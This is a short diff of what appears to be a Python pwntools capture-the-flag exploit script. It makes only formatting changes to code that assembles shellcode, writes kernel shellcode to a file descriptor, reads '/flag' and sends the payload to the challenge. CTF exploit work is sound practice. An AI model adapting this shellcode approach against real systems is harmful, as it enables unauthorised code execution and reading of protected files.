@@ -14,10 +14,11 @@ ret
 """)
     ushellcode = [
         shellcraft.write(3, kshellcode, len(kshellcode)),
-        shellcraft.cat('/flag'),
+        shellcraft.cat("/flag"),
     ]
     ushellcode = pwn.asm("".join(ushellcode))
     io.send(ushellcode)
+
 
 def ctf() -> None:
     root_bin = find_challenge()
